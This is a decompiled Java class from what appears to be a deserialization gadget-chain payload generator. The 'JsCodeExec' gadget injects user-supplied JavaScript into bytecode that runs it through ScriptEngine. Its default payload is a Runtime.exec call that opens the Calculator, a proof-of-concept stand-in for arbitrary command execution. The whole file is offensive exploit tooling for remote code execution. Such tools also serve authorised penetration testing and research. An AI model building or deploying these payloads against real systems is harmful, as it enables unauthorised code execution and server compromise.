//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.ar3h.plugin.fr.gadget.impl.bytecode.common;

import com.ar3h.chains.common.Gadget;
import com.ar3h.chains.common.GadgetChain;
import com.ar3h.chains.common.GadgetContext;
import com.ar3h.chains.common.annotations.GadgetAnnotation;
import com.ar3h.chains.common.annotations.GadgetTags;
import com.ar3h.chains.common.param.Param;
import com.ar3h.chains.common.util.JavassistHelper;
import com.ar3h.plugin.fr.gadget.impl.bytecode.common.template.JsCodeExecBytecode;
import org.apache.commons.lang.StringEscapeUtils;

@GadgetTags(
        tags = {"Bytecode", "END"}
)
@GadgetAnnotation(
        name = "执行Js命令",
        description = "使用ScriptEngine执行JS代码",
        authors = {"se1zer"},
        priority = 10
)
public class JsCodeExec implements Gadget {
    @Param(
            name = "Js代码",
            description = "default: Runtime.getRuntime().exec('open -a Calculator')"
    )
    public String code = "java.lang.Runtime.getRuntime().exec('open -a Calculator')";

    public JsCodeExec() {
    }

    public byte[] getObject() {
        String javaSafeCode = StringEscapeUtils.escapeJava(this.code);
        JavassistHelper javassistHelper = new JavassistHelper(JsCodeExecBytecode.class);
        javassistHelper.modifyStringField("code", javaSafeCode);
        return javassistHelper.getBytecode();
    }

    public Object invoke(GadgetContext context, GadgetChain chain) throws Exception {
        chain.doCreate(context);
        return this.getObject();
    }
}
